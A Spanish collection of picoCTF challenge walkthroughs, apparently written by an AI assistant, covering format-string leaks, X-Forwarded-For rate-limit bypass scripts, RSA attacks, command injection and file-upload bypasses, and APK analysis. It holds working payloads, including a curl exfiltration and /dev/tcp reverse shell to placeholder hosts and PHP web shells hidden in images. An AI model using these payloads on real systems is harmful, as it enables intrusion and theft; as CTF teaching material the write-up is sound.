- Si `binwalk -e` encuentra algo (ZIP, gzip, PNG, ELF), revisa el contenido extraído: la flag suele estar dentro de un archivo simple (.txt, .pdf) del ZIP.
    
- Si `grep -aob` encuentra múltiples `PK` o `%PDF`, prueba cada offset.
    
- Si `steghide info` pide passphrase, prueba `''` (vacío) o `picoCTF`, `password`, `ctf` como primeras opciones.
    
- Trabaja siempre con copias (no sobrescribas el original).
    
- Si todo falla, sube aquí el archivo y lo analizo yo paso a paso y te devuelvo la flag exacta + comando que la extrajo.
    

---

### **Referencias (rápidas)**

- `binwalk` — detectar/extractar firmas incrustadas.
    
- `exiftool`, `strings`, `foremost`, `steghide`, `stegsolve`.
    
- Uso de `dd`/`grep -aob` para extraer archivos pegados tras EOF.
### Reto: Input Injection 1

**Descripción:**  
A friendly program wants to greet you… but its goodbye might say more than it should. Can you convince it to reveal the flag?  
Additional details will be available after launching your challenge instance.

---

### **Solución** _(relajada y directa — pasos mínimos para explotar)_

**Idea clave:** el programa imprime tu entrada de forma insegura (vulnerabilidad _format string_). Al enviar especificadores de formato puedes filtrar la memoria y leer la flag. Flujo: ejecutar la instancia, confirmar que responde a payloads tipo `%x`/`%s`, encontrar el offset correcto (p.ej. `%6$s`) y leer la dirección/cadena que contiene la flag.

1. **Lanza la instancia y prueba interacción básica**
    

`# ejecutar localmente si te dieron un binario ./challenge # o conectar a la instancia remota nc HOST PORT`

Enviar algo simple para ver comportamiento:

`Hello`

2. **Probar si hay format-string (detección rápida)**  
    Desde la terminal (o con netcat) envía:
    

`%x %x %x %x %x`

Si el programa devuelve campos hex separados → confirma que está pasando tu entrada directamente a `printf`/`fprintf` como formato.

3. **Encontrar el offset correcto**  
    Envía payload con identificadores posicionales hasta que veas una cadena legible o una dirección:
    

`%1$x %2$x %3$x %4$x %5$x %6$x %7$x %8$x`

O prueba:

`%1$s %2$s ...`

Busca el offset que al usar `%N$s` imprime texto legible (podría ser parte de la flag). Por ejemplo si `%6$s` devuelve algo con `picoCTF{...}`, ese es el objetivo.

4. **Leer la flag con el offset correcto**  
    Si encontraste que `%6$s` o `%10$s` muestra la flag, solo manda:
    

`%6$s`

y copia la salida. Si la flag no está directamente en la pila sino en una dirección (p.ej. un puntero), primero filtra la dirección con `%N$x` y luego úsala con `%m$s`.

5. **Automatizar con pwntools (útil para pruebas repetidas)**  
    Guarda esto como `exploit.py` y modifica `HOST,PORT` o el comando local.
    

`#!/usr/bin/env python3 from pwn import *  # conecta local o remoto # p = process('./challenge')      # si tienes binario p = remote('HOST', PORT)           # si es instancia remota  def send_recv(payload):     p.sendline(payload)     return p.recvline(timeout=1).decode(errors='ignore')  # 1) test detect print(send_recv('%x %x %x %x %x %x %x %x'))  # 2) bruteforce offset hasta que veas algo tipo picoCTF{ for i in range(1,40):     p = remote('HOST', PORT)     payload = f'%{i}$s'     p.sendline(payload)     resp = p.recvline(timeout=1).decode(errors='ignore')     print(i, resp.strip())     p.close()  # 3) una vez conocido el offset (ejemplo offset=7) p = remote('HOST', PORT) p.sendline('%7$s') print('flag:', p.recvline(timeout=1)) p.close()`

6. **Si `%N$s` devuelve segfault o datos inválidos**
    

- puede que necesites leer primero una dirección con `%N$x` (ej. `%10$x`) y luego usarla en `printf` con `%s` (formato: enviar la dirección en la entrada de manera que quede en la pila en la posición adecuada).
    
- si hay protección ASLR/stack canaries, el reto suele estar diseñado para leer sólo (no escribir), así que el enfoque de solo lectura con `%N$s` normalmente funciona.
    

---

### **Notas adicionales**

- Empieza por detectar si la entrada se usa directo como _format string_ (payloads `%x` son la forma más rápida).
    
- Si el servicio imprime varias líneas, adapta `recv`/`recvline` en tu script.
    
- No intentes `%n` a menos que quieras escribir — esos payloads son más ruidosos y peligrosos.
    
- Trabaja con copias del flujo y automatiza la búsqueda de offset (el bucle en el script).
    
- Si la instancia limita tamaño o filtra `%` a `%%`, prueba alternativas (por ejemplo inyectar bytes nulos o usar URL encoding según el endpoint).
    

---

### **Referencias**

- Cheatsheet breve de _format string_ (detección con `%x`, lectura con `%N$s`).
    
- pwntools — para automatizar conexión y envío de payloads.
### Reto: Crack the Gate 2

**Descripción:**  
The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We’ve received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: ctf-player@picoctf.org and uncover the hidden secret.  
Additional details will be available after launching your challenge instance.

---

### **Solución** _(relajada y directa — pasos mínimos y comandos)_

**Idea clave:** el rate-limiter se basa en la **IP de origen** pero el servidor confía en cabeceras controlables por el cliente (ej. `X-Forwarded-For`, `Forwarded`, `X-Real-IP`, `CF-Connecting-IP`). Cambiando esa cabecera o rotándola por intento puedes aparentar ser clientes distintos y evitar el bloqueo. Alternativa: el rate-limiter puede checar una cookie/session o una cabecera específica (`X-Client-IP`, `True-Client-IP`) — hay que probar varias.

1. **Comprobar comportamiento del rate-limit**
    
    - Lanza la instancia y realiza varios intentos fallidos desde tu IP hasta que recibas el bloqueo (por ejemplo `429` o mensaje de bloqueo).
        
    - Observa respuesta y cabeceras (`Retry-After`, `X-RateLimit-*`) — te da pistas de cómo se identifica al cliente.
        
2. **Probar spoofing de cabeceras simples (curl)**
    
    - Prueba enviar intentos con `X-Forwarded-For` diferente para cada intento:
        
    
    `# intento normal curl -s -X POST https://HOST/login \   -H "Content-Type: application/json" \   -d '{"email":"ctf-player@picoctf.org","password":"badpass"}' -i  # intento con X-Forwarded-For spoofeada curl -s -X POST https://HOST/login \   -H "Content-Type: application/json" \   -H "X-Forwarded-For: 1.2.3.4" \   -d '{"email":"ctf-player@picoctf.org","password":"badpass"}' -i  # rotar IPs rápidamente (ejemplo) for i in $(seq 10 15); do   ip="10.0.$i.$((i+1))"   curl -s -X POST https://HOST/login \     -H "Content-Type: application/json" \     -H "X-Forwarded-For: $ip" \     -d '{"email":"ctf-player@picoctf.org","password":"badpass"}' -i done`
    
    - Revisa si la respuesta deja pasar el intento (no 429). Si sí → bypass conseguido.
        
3. **Probar otras cabeceras usadas por proxies**
    
    - `X-Real-IP`, `Forwarded`, `True-Client-IP`, `CF-Connecting-IP`, `X-Client-IP`:
        
    
    `curl -X POST https://HOST/login \   -H "Content-Type: application/json" \   -H "X-Real-IP: 8.8.8.8" \   -d '{"email":"ctf-player@picoctf.org","password":"badpass"}' -i`
    
4. **Si la app usa JSON o parámetros distintos**
    
    - Asegúrate de replicar exactamente la petición real (headers `Content-Type`, cookies). Usa Burp Repeater/Intercept para ver y reproducir la petición tal cual y añadir la cabecera spoofeada.
        
5. **Rotación automática de cabeceras (script Python)**
    
    - Script rápido que intenta login variando `X-Forwarded-For` hasta conseguir acceso o hasta agotar intentos:
        
    
    `# rotate_headers.py (ejemplo) import requests, random  url = "https://HOST/login" for i in range(1,300):     ip = f"172.16.{random.randint(0,255)}.{random.randint(1,254)}"     headers = {         "Content-Type":"application/json",         "X-Forwarded-For": ip,         "User-Agent": "curl/7.XX"     }     payload = {"email":"ctf-player@picoctf.org","password":"badpass"}     r = requests.post(url, json=payload, headers=headers, allow_redirects=False)     print(i, ip, r.status_code)     if r.status_code == 200 or "Welcome" in r.text or "flag" in r.text:         print("Posible acceso con", ip)         print(r.text)         break`
    
    - Ajusta detección de éxito (200, redirect, contenido con `secret`/`flag`).
        
6. **Si el rate-limit también usa cookies / session**
    
    - Limpia cookies entre intentos (`--cookie-jar / --cookie` en curl) o usa cabeceras `Cookie:` diferentes.
        
    - También prueba rotar `User-Agent` o `Referer` si el bloqueo es por combinación.
        
7. **Si nada de lo anterior funciona**
    
    - Revisa si el servicio valida la cabecera comparándola con la IP TCP real (ej. use de `remote_addr`). En ese caso el spoof no funcionará y hay que buscar otra debilidad: credenciales en JS, endpoints de debug, o una ruta de admin. Inspecciona código cliente y endpoints expuestos (`/.git`, `/admin`, `/debug`).
        
8. **Acceso y extracción de secreto**
    
    - Una vez logues con éxito, navega a la sección privada y busca el secreto/flag (área `profile`, `admin`, `/secret.txt`, etc.). Copia la flag.
        

---

### **Notas adicionales**

- Prueba primero con una IP no real (privada) para no generar ruido público; si la instancia valida formato, cualquier valor sirve para la prueba.
    
- Si el servidor está detrás de un WAF o CDN puede filtrar/ignorar cabeceras; en ese caso el vector falla.
    
- Respeta límites y ética: aplica esto solo a la instancia del reto o sistemas autorizados.
    
- Usa Burp Suite Repeater/Intruder para iterar rápido y ver respuestas completas.
    
- Detecta éxito por código HTTP, redirección, o por que la respuesta incluya palabras como `welcome`, `secret`, `flag`.
    

---

### **Referencias**

- OWASP — Rate Limiting best practices (conceptos generales).
    
- RFC7239 — `Forwarded` header (cómo se debe usar).
    
- Artículos y posts sobre `X-Forwarded-For` spoofing y bypasses de rate-limiting.
### Reto: Crack the Power

**Descripción:**  
We received an encrypted message. The modulus is built from primes large enough that factoring them isn’t an option, at least not today. See if you can make sense of the numbers and reveal the flag.  
Download the message.

---

### **Solución** _(relajada y práctica — pasos y scripts que puedes ejecutar)_

**Idea clave:** el fichero probablemente contiene valores RSA (`n`, `e`, `c`) o algo similar. Como `n` no es factorizable con facilidad, hay que intentar vulnerabilidades que **no requieren factorizar**: ataques por **exponente pequeño / broadcast (Håstad)**, **Wiener** (si `d` pequeño), **Fermat** si factores están cercanos, ataques por **p‑1/p+1**, buscar **gcd** con otros módulos, o analizar si el mensaje está repetido y fue cifrado con distinto `n`. Abajo tienes una lista de comprobaciones ordenadas y fragmentos de código (Python) para probarlas rápidamente.

> Trabaja siempre con una copia del archivo. Si prefieres, súbeme el archivo y yo lo corro y te devuelvo la flag y el comando exacto.

---

## 1) Preparación — extraer `n, e, c`

(Asumo que el archivo contiene texto con líneas `n = ...`, `e = ...`, `c = ...` o JSON.)  
Ejemplo rápido para parsear un archivo `msg.txt` con `n=...`:

`# inspecciona el archivo head -n 50 msg.txt # si es JSON: jq . msg.json`

Si los números están en decimal o hex, conviértelos a enteros en el script que viene abajo.

---

## 2) Script “probe” que automatiza los ataques comunes

Guarda esto como `crack_power_probe.py`. Ejecuta `python3 crack_power_probe.py msg.txt`.  
(Instala `sympy` y `gmpy2` si puedes: `pip install sympy gmpy2`).

`#!/usr/bin/env python3 # crack_power_probe.py import sys,math,subprocess from fractions import Fraction import gmpy2  def read_params(path):     # ajusta según formato; soporta lines: n=..., e=..., c=...     n=e=c=None     with open(path) as f:         for L in f:             L=L.strip()             if '=' in L:                 k,v = [x.strip() for x in L.split('=',1)]                 if k.lower().startswith('n'): n=int(v,0)                 if k.lower().startswith('e'): e=int(v,0)                 if k.lower().startswith('c'): c=int(v,0)     return n,e,c  # ---------- utilities ---------- def is_perfect_power(a, e):     # chequea si a es un e‑ésimo poder perfecto     root = int(gmpy2.iroot(a, e)[0])     return root if pow(root, e) == a else None  # ---------- attacks ---------- def try_fermat(n, limit=1<<26):     # búsqueda sencilla: p,q cercanos     a = gmpy2.isqrt(n)     if a*a < n: a += 1     for i in range(limit):         b2 = a*a - n         if b2 >= 0:             b = gmpy2.isqrt(b2)             if b*b == b2:                 p = a - b                 q = a + b                 if p*q == n:                     return int(p), int(q)         a += 1     return None  def try_pollard_p1(n, bound=1000000):     # intenta Pollard p-1 usando sympy's factorint fallback is slow;     # prefer usar yafu/msieve para factoring serio (comando externo)     try:         import sympy         f = sympy.factorint(n, limit=bound)         # si encontró factor distinto de n         for k in f:             if k>1 and n%k==0 and k!=n:                 return k, n//k     except Exception:         pass     return None  def wiener_attack(n,e):     # implementación básica de Wiener (continued fractions)     from math import floor     def cont_frac(numer,denom):         cf=[]         while denom:             q = numer//denom             cf.append(q)             numer,denom = denom, numer - q*denom         return cf     def conv(cf):         from fractions import Fraction         frac = Fraction(0,1)         for a in reversed(cf):             frac = 1/(frac) if frac!=0 else Fraction(1,a)             frac = Fraction(a,1) + frac - Fraction(0,1)         return None      # use gmpy2's continued_fraction convergents helper? implement classic     cf=[]     a,b = e,n     while b:         cf.append(a//b)         a,b = b, a - b*(a//b)     # convergents     for i in range(len(cf)):         num=1; den=0         for c in cf[:i+1][::-1]:             num,den = den+c*num, num         k = num         d = den         if k==0: continue         if (e*d - 1) % k != 0: continue         phi = (e*d - 1)//k         s = n - phi + 1         disc = s*s - 4*n         if disc>=0:             t = gmpy2.isqrt(disc)             if t*t == disc:                 p = (s - t)//2                 q = (s + t)//2                 if p*q == n:                     return (int(p),int(q),int(d))     return None  def try_low_e_broadcast(es, ns, cs):     # Håstad: if same small e and message small and gcd(ns pairwise)=1,     # compute CRT and take integer e-th root     from functools import reduce     def crt_pair(a1,n1,a2,n2):         m1 = n1; m2 = n2         g = gmpy2.gcd(m1,m2)         if g != 1:             return None         inv = int(gmpy2.invert(m1, m2))         x = ( (a2 - a1) * inv ) % m2         res = a1 + m1 * x         mod = m1*m2         return res % mod, mod     # iterative CRT     R = cs[0]; M = ns[0]     for i in range(1,len(ns)):         r,m = crt_pair(R,M,cs[i],ns[i])         if r is None:             return None         R,M = r,m     # try integer e-th root     for e in range(2,13):         root = gmpy2.iroot(R, e)         if root[1]:             return int(root[0]), e     return None  # ---------- main ---------- if __name__ == "__main__":     if len(sys.argv)<2:         print("Uso: python3 crack_power_probe.py msg.txt")         sys.exit(1)     n,e,c = read_params(sys.argv[1])     print("n,e,c loaded", bool(n), bool(e), bool(c))     if not (n and e and c):         print("No pudo parsear n,e,c. Ajusta read_params o sube el fichero.")         sys.exit(1)      # quick checks     print("Checking small exponent perfect-power (e-th root) for ciphertext...")     try:         r = is_perfect_power(c, e)         if r:             print("[+] Ciphertext is exact e-th power. plaintext=root:", r)             try:                 print("plaintext bytes:", r.to_bytes((r.bit_length()+7)//8,'big'))             except:                 pass      except Exception as ex:         pass      print("Trying Fermat (close primes)...")     fac = try_fermat(n, limit=1<<22)     if fac:         print("[+] Fermat succeeded:", fac)         sys.exit(0)     print("Trying Pollard p-1 (sympy fallback)...")     fac = try_pollard_p1(n, bound=100000)     if fac:         print("[+] Pollard p-1 found factors:", fac)         sys.exit(0)     print("Trying Wiener's attack (small d)...")     w = wiener_attack(n,e)     if w:         p,q,d = w         print("[+] Wiener found p,q,d. d=",d)         sys.exit(0)      print("No trivial factor or Wiener. Consider trying external tools (ECM/msieve/yafu).")     print("Saved: you should try msieve/yafu/ecm, or upload file so I run them for you.")`

**Qué hace:**

- chequeos rápidos: si `c` es exactamente un e-ésimo poder (caso `e` pequeño y sin padding).
    
- intento de Fermat (p,q cercanos).
    
- intento simple de Pollard‑p‑1 (muy básico).
    
- intento de Wiener (buscar `d` pequeño).  
    Si alguno tiene éxito, el script imprime factores o `d`. Con `p,q` puedes descifrar normalmente:
    

`phi = (p-1)*(q-1) d = pow(e, -1, phi) m = pow(c, d, n) print(bytes.fromhex(hex(m)[2:]))`

---

## 3) Otras técnicas a probar (comandos / tools)

- **Buscar gcd con otros módulos** (si tienes varios `n`):
    

`# en Python from math import gcd g = gcd(n1,n2) if g != 1 and g != n1 and g!= n2: print("common factor:", g)`

- **Broadcast attack (Håstad)** — si tienes el mismo mensaje con mismo `e` y distintos `n` (pairwise coprime). Usa `sage` o implementa CRT+iroot (ver función `try_low_e_broadcast`).
    
- **ECM / msieve / yafu** para factores grandes (comandos):
    

`# ejemplo con yafu (si instalado) yafu "factor(<n>)" # con msieve msieve -v -q -factor <n> # con ecm (gmp-ecm) ecm -c -o out.txt <n>`

Si uno de estos encuentra un factor, usa el paso de descifrar con `d`.

- **Boneh-Durfee / Coppersmith**: si sospechas `d` algo menos que `n^0.292`, puedes intentar ataques LLL/Coppersmith (requiere Sage / scripts complejos). Hay implementaciones en `rsatool`/`RsaCtfTool`.
    
- **RsaCtfTool** (multiherramienta CTF) — intenta muchos ataques automáticamente:
    

`git clone https://github.com/ivan-sincek/rsa_ctf_tools.git # o usar la versión común: git clone https://github.com/Ganapati/RsaCtfTool.git python3 RsaCtfTool/RsaCtfTool.py --publickey pubkey.pem --uncipher ciphertext.bin # o pasar n,e,c directo según la herramienta`

---

## 4) Si obtienes p,q → descifrar y obtener flag

`# con p,q obtenidos: phi = (p-1)*(q-1) d = pow(e, -1, phi) m = pow(c, d, n) msg = int.to_bytes(m, (m.bit_length()+7)//8, 'big') print(msg)`

Si el mensaje está embebido (padding PKCS#1 v1.5), búscalo dentro del `msg` (habitualmente `b'picoCTF{'` o similar).

---

## Notas adicionales (cortas)

- Muchos CTFs usan **mensaje corto + e pequeño** → Håstad. Revisa siempre si `c < n` y `c` es e‑ésimo perfecto.
    
- **Wiener** es una de las ofensivas más rápidas si `d < n^{0.25}` aproximadamente.
    
- Si el autor dice “primes large enough that factoring isn’t an option”, suele implicar que el intended solution **no** es factorizar sino usar alguna vulnerabilidad matemática (pequeño `d`, pequeño `e`, broadcast, etc.).
    
- Si el archivo contiene **varios pares** `(n,e,c)`, prueba gcd entre todos los `n` y ataques broadcast.
    
- Herramientas recomendadas: `gmpy2`, `sympy`, `RsaCtfTool`, `msieve`, `yafu`, `gmp-ecm`.
    

---

## Referencias

- Wiener's attack — paper y tutoriales (implementaciones en múltiples repos).
    
- Håstad broadcast attack — CRT + e‑th root.
    
- RsaCtfTool / rsa_ctf_tools — colección de ataques automatizados.
    
- msieve / yafu / gmp-ecm — herramientas de factorización.
### Reto: Input Injection 2

**Descripción:**  
This program greets you and then runs a command. But can you take control of what command it executes?  
Additional details will be available after launching your challenge instance.

---

### **Solución** _(relajada, directa y práctica)_

**Idea clave:** la aplicación incorpora tu entrada dentro de un comando del sistema (por ejemplo `system()` / `popen` / backticks). Si no está correctamente saneada, basta con inyectar operadores de shell (`;`, `&&`, `|`, `` `...` ``, `$(...)`) para encadenar/ejecutar comandos arbitrarios. El objetivo concreto suele ser leer la flag con `cat` y devolverla por la salida que el servicio muestra.

#### 1) Recon rápido

- Ejecuta localmente el binario o conéctate a `HOST:PORT` (según te den la instancia).
    
- Envía una entrada corta y observa cómo responde (¿imprime tu entrada en una línea que luego ejecuta?).
    

#### 2) Pruebas rápidas — detección de inyección

Envía payloads que no rompan nada y muestren comportamiento distinto:

``; echo INJ && echo INJ | echo INJ `echo INJ` $(echo INJ)``

Si la salida contiene `INJ`, hay inyección de comandos.

#### 3) Payloads para extraer la flag (comandos típicos)

- Si la flag suele estar en `/flag` o `/home/ctf-player/flag` prueba:
    

`` ; cat /flag ; cat /home/ctf-player/flag && cat /flag $(cat /flag) `cat /flag` ``

- Si la app filtra `;` intenta alternativas:
    

``&& cat /flag | cat /flag $(cat /flag) `cat /flag` %0a cat /flag   # newline injection via URL-encoding (web context)``

#### 4) Bypass de filtros comunes

- Si aceptan sólo caracteres alfanuméricos, usa `${IFS}` (espacio) y sustituciones:
    

`${IFS}cat${IFS}/flag ${IFS}c${IFS}a${IFS}t${IFS}/flag    # romper filtros que bloquean "cat"`

- Si bloquean `cat` y `;`, intenta `echo` + base64:
    

`; base64 /flag ; cat /flag | base64 ; awk '{print}' /flag ; sed -n '1,1p' /flag`

- Si se filtran backticks, prueba `$()` y viceversa.
    

#### 5) Extracción en entornos remotos con salida limitada

- Si la salida se recorta o no se muestra, vuelca la flag con `curl`/`nc` a tu servidor:
    

`# desde la app inyectada ; curl -X POST -d "$(cat /flag)" https://tu-server.example/recv # o ; /bin/sh -i >& /dev/tcp/TU_IP/TU_PORT 0>&1    # reverse shell (si permitido) # o uso de echo+base64 para evitar saltos raros ; echo $(base64 /flag)` 

(Avisar: sólo usar en la instancia del reto)

#### 6) Ejemplo con `curl` (web POST/JSON)

Si la entrada va en JSON al endpoint `/greet`, prueba:

`curl -s -X POST "https://HOST/greet" \   -H 'Content-Type: application/json' \   -d '{"name":"attacker; cat /flag"}'`

Si hay encoding/URL, codifica el payload:

`# URL-encoding para newline o caracteres especiales curl -s "https://HOST/greet?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote(';cat /flag'))")"`

#### 7) Automatizar con pwntools (si es servicio TCP)

Guarda como `exploit.py` y ajusta HOST/PORT:

`#!/usr/bin/env python3 from pwn import * HOST='HOST'; PORT=1234 p = remote(HOST, PORT) p.recvuntil(b'Name:')   # adaptar prompt p.sendline(b'; cat /flag')   # payload print(p.recvall(timeout=2).decode(errors='ignore')) p.close()`

---

### **Notas adicionales (cortas)**

- Prueba primero payloads no destructivos (`echo INJ`) para confirmar inyección.
    
- Usa `${IFS}` y construcciones alternativas si filtran espacios/caracteres.
    
- Si la app sanitiza `%` o símbolos, intenta URL-encoding/hex-escaping.
    
- Si sólo puedes inyectar una palabra, construye comando con llamadas internas (`sh -c` si permitido): `$(sh -c 'cat /flag')`.
    
- Trabaja con copia o sólo en la instancia del CTF (ética).
    
- Si la salida es binaria o mala, usa `base64` para transportar la flag de forma segura: `; base64 /flag`.
    

---

### **Referencias**

- OWASP — Command Injection (cheat sheet)
    
- PayloadsAllTheThings — Command Injection examples (operadores `;`, `&&`, `|`, `$()`, backticks, `${IFS}`)
    
- pwntools — automatización de explotación
### Reto: byp4ss3d

**Descripción:**  
A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.  
_(Formato: título / descripción / solución / notas adicionales / referencias — versión relajada y breve.)_

---

### **Solución** _(relajada y directa — técnicas y comandos para probar)_

**Idea clave:** los filtros suelen confiar en **nombre/extension**, **Content-Type** enviado por el cliente o en una verificación débil (p. ej. `finfo` parcial, comprobar sólo la extensión, o `getimagesize()` que acepta cabezeras mínimas). Prueba varias _bypass_ comunes: **doble extensión / filename spoofing**, **mimetype spoofing**, **imagen + payload appended** (polyglot), **EXIF/metadata payload**, **multipart boundary trick**, y **ZIP/Archive with inner file**. Siempre prueba si el archivo subido queda accesible públicamente y cuál es la URL/extension final.

A continuación pasos prácticos y comandos (ajusta `HOST`, `ENDPOINT`, `FIELDNAME`, `UPLOAD_URL`):

1. **Recon — ver cómo valida / guarda el archivo**
    

`# 1) subir una imagen inocua y ver la respuesta curl -i -X POST "https://HOST/upload" \   -F "file=@id.jpg"   # 2) inspecciona la respuesta: ¿te devuelve URL? ¿ruta? ¿status code 200/201?`

Si la respuesta incluye ruta (`/uploads/2025/abc.jpg`) prueba abrirla en el navegador.

---

2. **Spoof de nombre/extension (double extension / filename override)**  
    Muchos servidores usan el `filename` del multipart o la extensión original. Forzar nombre `.php` en el campo filename:
    

`# crea una copia válida de jpg cp id.jpg tmp.jpg  # manda como filename shell.php (pero con contenido JPG) curl -i -X POST "https://HOST/upload" \   -F "file=@tmp.jpg;filename=shell.php;type=image/jpeg"`

Si el servidor guarda exactamente `shell.php` y el directorio es accesible con PHP habilitado → `https://HOST/uploads/shell.php` ejecutará tu código.

---

3. **Append PHP after EOF (JPEG polyglot)**  
    JPEG: datos después de `FFD9` suelen ser ignorados por visores, pero si el archivo se guarda **con .php** y el servidor ejecuta PHP por extensión, el payload será ejecutable.
    

`# append php webshell to an existing JPG cp id.jpg shell.jpg printf '<?php echo file_get_contents("/flag"); ?>' >> shell.jpg  # upload but force filename .php curl -i -X POST "https://HOST/upload" \   -F "file=@shell.jpg;filename=shell.php;type=image/jpeg"`

Luego visita `https://HOST/uploads/shell.php`. Si el servidor guarda eso como `.php` → shell ejecutado.

---

4. **Metadata/EXIF injection**  
    Si el servidor sólo valida "es imagen" y luego _extrae_ metadata o reusa EXIF, puedes ocultar PHP en un tag:
    

`# insertar php en comentario EXIF exiftool -Comment='<?php system($_GET["c"]); ?>' id.jpg # subir id.jpg modificado curl -i -X POST "https://HOST/upload" -F "file=@id.jpg"`

A veces aplicaciones que procesan EXIF y luego escriben esos campos en archivos ejecutables/HTML cometen errores y ejecutan contenido.

---

5. **Multipart boundary / content-type tricks**  
    Algunas validaciones checan solo el primer part o el `Content-Type` enviado por el cliente. Envía un body multipart con primera parte “imagen” y segunda parte con tu `.php` real, o fuerza `Content-Type` a `image/jpeg` mientras el contenido real es PHP:
    

`# enviar archivo PHP pero mentir Content-Type printf '<?php echo "HELLO"; ?>' > shell.php curl -i -X POST "https://HOST/upload" \   -F "file=@shell.php;filename=shell.php;type=image/jpeg"`

---

6. **ZIP / archive uploading**  
    Si el uploader acepta `.zip` o automáticamente extrae/convierte contenido, incluye un archivo `shell.php` dentro del zip and upload:
    

`# crear zip con shell.php dentro zip payload.zip shell.php curl -i -X POST "https://HOST/upload" -F "file=@payload.zip"`

Si el servidor descomprime y guarda `shell.php` en un webroot → ejecución.

---

7. **Bypass getimagesize() / image-validators**  
    `getimagesize()` suele validar si estructura mínima existe; los encabezados suficientes bastan. Puedes crear un _minimal_ JPEG (o PNG) y concatenar payload:
    

`# minimal png header + php payload (ejemplo simple) printf '\x89PNG\r\n\x1a\n' > minimal.png # añadir chunk IDHR mínimamente válido o usa un real small.png cat small.png > minimal.png printf '<?php system($_GET["c"]); ?>' >> minimal.png  curl -i -X POST "https://HOST/upload" -F "file=@minimal.png;filename=shell.php;type=image/png"`

---

8. **Si el servidor re-encodes / valida firmemente**  
    Si la app re-encodes el archivo (p. ej. `convert` o `gd`), payloads appended serán eliminados. Entonces prueba **exif** o intenta **RCE via image-processing** (explotar vulnerabilities en convert/imagemagick — _ImageTragick_), o buscar endpoints que sólo validen y después muevan/rename sin procesar.
    

---

### **Notas adicionales (cortas y útiles)**

- **Siempre trabaja con una copia** del archivo de prueba.
    
- Comprueba si la URL de upload es accesible públicamente; si no, el exploit puede fallar.
    
- Si el servidor limpia la extensión, prueba nombre `shell.php.jpg` o `shell.jpg.php` (algunos frameworks toman la parte antes del primer `.`).
    
- Muchas protecciones realmente útiles: `finfo_file()` + comprobar encabezado + re-encode → dificulta la mayoría de estos bypasses.
    
- Si el uploader cambia contenido (re-encode), intenta EXIF o busca endpoints alternativos (`/tmp`, `/preview`, `/avatar`) que no re-encodeen.
    
- No uses reverse shells en sistemas que no te pertenecen (solo en la instancia del reto).
    

---

### **Referencias**

- PayloadsAllTheThings — File upload (bypass & web shells).
    
- OWASP — Unrestricted File Upload.
    
- Artículo: _ImageTragick_ (vulnerabilidades en ImageMagick).
    
- `exiftool` docs — para modificar EXIF.
    
- Guías CTF: “Bypassing file upload filters” (variantes: double extension, content-type spoof, polyglots, EXIF).
### Reto: M1n10n'5_53cr37

**Descripción:**  
Get ready for a mischievous adventure with your favorite Minions! They’ve been up to their old tricks, and this time, they've hidden the flag in a devious way within the Android source code. Your task is to channel your inner Minion and dive into the disassembled or decompiled code. Watch out, because these little troublemakers have hidden the flag in multiple sneaky spots or maybe even pulled a fast one and concealed it in the same location!  
Find the android apk here Minions Mobile Application and try to get the flag.

---

### **Solución** (relajada y directa — pasos mínimos que funcionen)

1. **Descarga y prepara**
    

`mkdir minions && cd minions # sustituye URL por la del APK wget -O minions.apk "URL_DEL_MINIONS_APK"`

2. **Inspección rápida (sin descompilar)**
    

`file minions.apk unzip -l minions.apk | sed -n '1,200p' # buscar strings rápidos dentro de APK (assets, resources, libs) strings minions.apk | egrep -i 'picoCTF|flag\{|FLAG\{|password|key|secret' || true`

3. **Descompilar / decompilar**
    

- **Opción 1 — jadx (rápido, ver código Java):**
    

`# descompila a Java legible jadx -d jadx_out minions.apk # buscar en el código generado grep -RIn "picoCTF\|flag\{|FLAG\{|secret\|password\|KEY" jadx_out || true`

- **Opción 2 — apktool (smali / recursos):**
    

`apktool d minions.apk -o apktool_out # revisar AndroidManifest y res grep -RIn "picoCTF\|flag\{" apktool_out || true less apktool_out/AndroidManifest.xml`

4. **Revisar assets / res / raw / shared_prefs**
    

`ls -la apktool_out/assets apktool_out/res/raw apktool_out/res || true grep -RIn "picoCTF\|flag\{|KEY\|SECRET" apktool_out || true # si hay archivos binarios extrae y strings for f in $(find apktool_out -type f -iname '*.bin' -o -iname '*.dat' -o -iname '*.so'); do strings "$f" | egrep -i 'picoCTF|flag\{' && echo "-> $f"; done`

5. **Buscar datos codificados / blobs / claves**
    

`# buscar base64 largo típico grep -RIEo '([A-Za-z0-9+/]{40,}={0,2})' apktool_out | head # si encuentras base64, decodifica: echo '<BASE64>' | base64 -d | strings`

6. **Revisar bibliotecas nativas (.so)**
    

`find apktool_out/lib -type f -name '*.so' -print -exec strings {} \; | egrep -i 'picoCTF|flag\{|secret|key' || true # si hay código nativo, usa radare2/ghidra para analizar`

7. **Buscar lógica dinámica / atajos en código (hardcoded keys, rutas, flags)**
    

`# buscar constantes en Java grep -RIn "picoCTF\|flag\{|FLAG\|getString(R.string" jadx_out || true # buscar llamadas a Log.* (a veces devuelven flag en logs) grep -RIn "Log\.d\|Log\.i\|System\.out" jadx_out | sed -n '1,200p'`

8. **Ejecutar la app y observar en runtime (si no hay flag estática)**
    

- Instala en emulador/Android VM y captura `logcat`:
    

`# instalar en emulador/device adb install -r minions.apk adb logcat -c adb logcat | egrep --line-buffered 'picoCTF|flag|SECRET' & # ejecutar la app manualmente y hacer acciones sospechosas`

- Si el programa construye la flag en runtime, puede aparecer en `logcat`.
    

9. **Instrumentación / hooking si está ofuscado**
    

- Si el código está ofuscado o la flag se arma en memoria, usa **frida** para interceptar funciones:
    

`# ejemplo rápido: hook a Java String concatenation o a método que devuelve flag # frida-snippet (ejecutar con frida -U -f <package> -l hook.js --no-pause)`

`hook.js` (ejemplo breve):

`Java.perform(function(){   var Target = Java.use('com.example.suspicious.ClassName'); // ajustar   Target.getSecret.implementation = function(){     var res = this.getSecret();     send('getSecret -> ' + res);     return res;   }; });`

10. **Si hay cifrado/obfuscación de strings**
    

- Busca funciones que desencripten strings (p. ej. AES/RC4/xor); identifica la clave hardcoded y ejecuta el mismo decodificador en Python:
    

`# ejemplo XOR simple cipher = bytes.fromhex("....") key = b'clave' plain = bytes([c ^ key[i%len(key)] for i,c in enumerate(cipher)]) print(plain)`

11. **Validación final**
    

- Cuando encuentres `picoCTF{...}` o similar, cópiala y pruébala en la plataforma.
    

---

